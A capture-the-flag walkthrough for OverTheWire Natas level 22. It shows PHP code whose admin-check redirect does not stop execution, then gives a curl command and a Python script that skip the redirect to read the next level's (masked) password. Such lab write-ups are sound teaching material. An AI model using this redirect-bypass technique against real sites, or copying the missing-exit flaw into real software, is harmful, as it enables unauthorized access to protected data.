## Level Goal
Excluding the URL and username, the Level Goal section is blank for the Natas ctf.


## Solution
This level greets us with a link to the source code and not much else. Guess that makes it pretty clear where we should start.

```php
<?
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?> 
```

Here we see the site is looking to see variable **revelio** is passed. Here we see the site is looking to see variable revelio is passed. Next, it checks to see if we have the admin key set in our SESSION and if so is the value set to 1.  If this check fails, we’re redirected; otherwise, we continue loading this page and fall into the following code:

```php
<?
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?> 
```

All we need to do is avoid the redirect. If you have access to curl, that will provide the easiest solution as curl doesn't follow redirects by default. A Python solution is also nice and quick. For either solution, you'll need to provide the password to the current level.

### curl
```bash
curl -u natas22:c------------------------------J http://natas22.natas.labs.overthewire.org/?revelio=1
```

### Python
```python
#!/usr/bin/env python
import requests
from requests.auth import HTTPBasicAuth

password = 'c------------------------------J'
session = requests.Session()
auth = HTTPBasicAuth('natas22', password)

url = 'http://natas22.natas.labs.overthewire.org/index.php?revelio'

resp = session.get(url=url, auth=auth, allow_redirects=False)
print(resp.text)
```
